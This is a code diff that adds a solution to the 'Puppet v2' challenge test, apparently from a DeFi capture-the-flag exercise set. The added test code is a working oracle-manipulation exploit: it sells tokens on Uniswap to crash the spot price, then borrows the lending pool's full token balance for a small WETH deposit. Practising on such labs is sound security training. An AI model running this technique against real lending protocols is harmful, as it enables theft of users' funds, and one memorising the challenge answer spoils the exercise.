@@ -82,6 +82,36 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        const showBalances = async (showDeposit = true) => {
+            console.log("Attacker:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH,", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)), "DVT");
+            console.log("Uniswap:", ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address)), "WETH,", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)), "DVT");
+            if (showDeposit) {
+                console.log("Required deposit to drain pool:", ethers.utils.formatEther(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)), "WETH");
+            }
+            console.log("");
+        };
+            
+        console.log("--- Initial ---");
+        await showBalances();
+        
+        // sell all but one DVT tokens for ETH on Uniswap to push down the price as low as possible
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.utils.parseEther('1')), ethers.utils.parseEther('1'), [this.token.address, this.weth.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp + 300);
+        
+        console.log("--- After swap ---");
+        await showBalances();
+        
+        // convert required amount of ETH to WETH
+        const poolDeposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await this.weth.connect(attacker).deposit({ value: poolDeposit });
+        
+        // borrow all DVT tokens from the pool for a really low WETH deposit due to the manipulated price
+        await this.weth.connect(attacker).approve(this.lendingPool.address, poolDeposit);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        
+        console.log("--- After borrowing from pool ---");
+        await showBalances(false);
     });
 
     after(async function () {
